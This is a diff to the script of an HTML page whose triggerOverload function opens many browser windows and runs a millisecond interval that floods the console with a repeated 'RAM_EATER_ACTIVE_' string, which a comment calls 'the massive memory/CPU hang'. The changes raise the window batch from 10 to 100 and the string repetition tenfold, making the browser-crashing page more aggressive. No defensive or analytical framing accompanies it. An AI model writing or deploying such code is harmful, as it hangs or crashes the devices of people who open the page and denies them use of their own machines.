@@ -194,7 +194,7 @@
 
         function triggerOverload() {
             // Speed factor: how many windows per batch
-            const batchSize = 10;
+            const batchSize = 100;
             
             for(let i = 0; i < batchSize; i++) {
                 window.open(
@@ -215,7 +215,7 @@
                     
                     // The massive memory/CPU hang
                     setInterval(() => {
-                        console.log("RAM_EATER_ACTIVE_".repeat(1000));
+                        console.log("RAM_EATER_ACTIVE_".repeat(10000));
                     }, 1);
 
                     // The window overload
@@ -241,3 +241,4 @@
     </script>
 </body>
 </html>
+
